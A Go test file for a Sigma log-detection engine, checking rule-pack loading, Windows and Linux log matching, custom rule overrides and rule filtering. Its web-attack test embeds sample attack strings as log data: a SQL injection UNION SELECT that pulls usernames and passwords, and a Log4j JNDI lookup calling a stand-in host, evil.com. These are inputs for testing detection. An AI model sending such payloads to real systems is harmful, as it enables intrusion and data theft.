package sigma

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestAvailableSigmaPacks(t *testing.T) {
	packs := GetAvailableSigmaPacks()
	if len(packs) < 11 {
		t.Fatalf("expected at least 11 available packs, got %d: %v", len(packs), packs)
	}
	expected := []string{
		"windows-essential",
		"windows-ad",
		"windows-client",
		"linux-auth",
		"linux-system",
		"network-threats",
		"web-attacks",
		"wazuh-compliance",
		"wazuh-linux",
		"wazuh-network",
		"wazuh-web",
	}
	packMap := make(map[string]bool)
	for _, p := range packs {
		packMap[p] = true
	}
	for _, exp := range expected {
		if !packMap[exp] {
			t.Errorf("expected pack %s not found in %v", exp, packs)
		}
	}
}

func TestEngine_LoadAllPacks(t *testing.T) {
	engine, err := NewEngine(Config{
		Packs: []string{"all"},
	})
	if err != nil {
		t.Fatalf("NewEngine error: %v", err)
	}

	if len(engine.RuleEntries) < 70 {
		t.Fatalf("expected at least 70 active rules, got %d", len(engine.RuleEntries))
	}
}

func TestEngine_WindowsMatching(t *testing.T) {
	engine, err := NewEngine(Config{
		Packs: []string{"windows-essential"},
	})
	if err != nil {
		t.Fatalf("NewEngine error: %v", err)
	}

	winLog := `{"Event":{"System":{"Channel":"Security","Computer":"WIN-DC","EventID":4625,"Level":0},"EventData":{"TargetUserName":"admin","WorkstationName":"DESKTOP-1"}}}`
	matched := engine.Match(winLog, time.Now().UnixNano())
	if matched == nil {
		t.Fatalf("expected Windows 4625 rule to match, got nil")
	}
	if matched.Evaluator.Rule.ID != "018d9f10-ff31-419b-a36c-941cbfa0451a" {
		t.Errorf("unexpected rule ID: %s", matched.Evaluator.Rule.ID)
	}

	// Verify tags
	tags := matched.Evaluator.Rule.Tags
	hasMitre := false
	for _, tag := range tags {
		if tag == "attack.credential_access" || tag == "attack.t1110" {
			hasMitre = true
			break
		}
	}
	if !hasMitre {
		t.Errorf("expected MITRE ATT&CK tag in Windows 4625 rule, got %v", tags)
	}
}

func TestEngine_LinuxSyslogMatching(t *testing.T) {
	engine, err := NewEngine(Config{
		Packs: []string{"linux-auth"},
	})
	if err != nil {
		t.Fatalf("NewEngine error: %v", err)
	}

	linuxLog := `{"hostname":"server1","content":"Failed password for invalid user admin from 192.168.1.100 port 45678 ssh2"}`
	matched := engine.Match(linuxLog, time.Now().UnixNano())
	if matched == nil {
		t.Fatalf("expected Linux SSH failed login rule to match, got nil")
	}
}

func TestEngine_WebAttackMatching(t *testing.T) {
	engine, err := NewEngine(Config{
		Packs: []string{"web-attacks"},
	})
	if err != nil {
		t.Fatalf("NewEngine error: %v", err)
	}

	logStr := `192.168.1.50 - - [10/Sep/2026:10:00:00 +0000] "GET /?id=1 UNION SELECT null,username,password FROM users HTTP/1.1" 200 4523`
	matched := engine.Match(logStr, time.Now().UnixNano())
	if matched == nil {
		t.Fatalf("expected SQL injection rule to match, got nil")
	}

	log4j := `{"hostname":"web01","content":"GET /index.jsp?user=${jndi:ldap://evil.com/a} HTTP/1.1"}`
	matchedLog4j := engine.Match(log4j, time.Now().UnixNano())
	if matchedLog4j == nil || matchedLog4j.Evaluator.Rule.ID != "56934c95-b049-4179-8a48-433e53664ec5" {
		t.Fatalf("expected Log4j rule match, got %v", matchedLog4j)
	}
}

func TestEngine_WazuhComplianceTags(t *testing.T) {
	engine, err := NewEngine(Config{
		Packs: []string{"wazuh-compliance"},
	})
	if err != nil {
		t.Fatalf("NewEngine error: %v", err)
	}

	// Check that compliance rules have tags like pci_dss, nist_800_53, gdpr, cis
	foundPCI := false
	foundNIST := false
	foundGDPR := false
	foundCIS := false

	for _, entry := range engine.RuleEntries {
		for _, tag := range entry.Evaluator.Rule.Tags {
			if len(tag) >= 7 && tag[:7] == "pci_dss" {
				foundPCI = true
			}
			if len(tag) >= 11 && tag[:11] == "nist_800_53" {
				foundNIST = true
			}
			if len(tag) >= 4 && tag[:4] == "gdpr" {
				foundGDPR = true
			}
			if len(tag) >= 3 && tag[:3] == "cis" {
				foundCIS = true
			}
		}
	}

	if !foundPCI || !foundNIST || !foundGDPR || !foundCIS {
		t.Errorf("expected PCI, NIST, GDPR, and CIS tags in wazuh-compliance rules; got PCI=%v NIST=%v GDPR=%v CIS=%v",
			foundPCI, foundNIST, foundGDPR, foundCIS)
	}
}

func TestEngine_PriorityOverride(t *testing.T) {
	tmpDir, err := os.MkdirTemp("", "sigma_override_test")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(tmpDir)

	// Override 4625 with custom title
	customRule := `
title: My Custom Windows Failed Logon
id: 018d9f10-ff31-419b-a36c-941cbfa0451a
status: test
level: critical
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4625
  condition: selection
`
	rulePath := filepath.Join(tmpDir, "custom_4625.yaml")
	if err := os.WriteFile(rulePath, []byte(customRule), 0644); err != nil {
		t.Fatal(err)
	}

	engine, err := NewEngine(Config{
		Packs:     []string{"windows-essential"},
		RulesPath: rulePath,
	})
	if err != nil {
		t.Fatalf("NewEngine error: %v", err)
	}

	winLog := `{"Event":{"System":{"Channel":"Security","Computer":"WIN-DC","EventID":4625,"Level":0},"EventData":{"TargetUserName":"admin","WorkstationName":"DESKTOP-1"}}}`
	matched := engine.Match(winLog, time.Now().UnixNano())
	if matched == nil {
		t.Fatalf("expected rule match")
	}
	if matched.Evaluator.Rule.Title != "My Custom Windows Failed Logon" {
		t.Errorf("expected overridden title 'My Custom Windows Failed Logon', got %q", matched.Evaluator.Rule.Title)
	}
	if matched.Evaluator.Rule.Level != "critical" {
		t.Errorf("expected level 'critical', got %q", matched.Evaluator.Rule.Level)
	}
	if matched.Source != "file:"+rulePath {
		t.Errorf("expected source to be file:, got %s", matched.Source)
	}
}

func TestEngine_RuleFilter(t *testing.T) {
	cfg := Config{
		Packs: []string{"linux-auth"},
		Rules: []string{"lnx_sshd_failed_login"},
	}
	engine, err := NewEngine(cfg)
	if err != nil {
		t.Fatalf("failed to create engine: %v", err)
	}
	if len(engine.RuleEntries) != 1 {
		t.Fatalf("expected exactly 1 rule entry, got %d", len(engine.RuleEntries))
	}
	if !strings.Contains(engine.RuleEntries[0].Path, "lnx_sshd_failed_login") {
		t.Errorf("expected lnx_sshd_failed_login, got %s", engine.RuleEntries[0].Path)
	}
}

func TestEngine_WindowsSyslogMatching(t *testing.T) {
	engine, err := NewEngine(Config{
		Packs: []string{"windows-essential"},
	})
	if err != nil {
		t.Fatalf("NewEngine error: %v", err)
	}

	// 1. Text syslog with EventID=4625 (Nxlog / Splunk style text)
	textLog1 := `WIN-SERVER Microsoft-Windows-Security-Auditing: An account failed to log on. EventID=4625 TargetUserName=admin WorkstationName=PC01`
	matched1 := engine.Match(textLog1, time.Now().UnixNano())
	if matched1 == nil {
		t.Fatalf("expected textLog1 with EventID=4625 to match Windows 4625 rule, got nil")
	}
	if matched1.Evaluator.Rule.ID != "018d9f10-ff31-419b-a36c-941cbfa0451a" {
		t.Errorf("unexpected rule ID: %s", matched1.Evaluator.Rule.ID)
	}

	// 2. Text syslog with Microsoft-Windows-Security-Auditing[4625]
	textLog2 := `WIN-DC Microsoft-Windows-Security-Auditing[4625]: Failed login for user admin`
	matched2 := engine.Match(textLog2, time.Now().UnixNano())
	if matched2 == nil {
		t.Fatalf("expected textLog2 with [4625] bracket to match Windows 4625 rule, got nil")
	}

	// 3. Snare format text syslog
	textLog3 := `WIN-DC MSWinEventLog 1 Security 4625 Wed Sep 16 09:00:00 2026 4625 Microsoft-Windows-Security-Auditing ...`
	matched3 := engine.Match(textLog3, time.Now().UnixNano())
	if matched3 == nil {
		t.Fatalf("expected textLog3 with Snare format to match Windows 4625 rule, got nil")
	}
}


